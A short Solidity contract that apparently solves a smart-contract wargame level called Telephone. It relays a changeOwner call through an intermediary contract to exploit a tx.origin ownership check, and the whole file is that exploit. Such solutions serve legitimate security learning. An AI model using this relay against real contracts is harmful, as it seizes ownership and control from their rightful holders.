// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface DeployedTelephone {
  function changeOwner(address _owner) external;
}

contract Telephone {

  constructor() {
  }
  
  function callTelephone(address _addr, address _newOwner) public {
    DeployedTelephone myPhone = DeployedTelephone(_addr);
    myPhone.changeOwner(_newOwner);
  }

}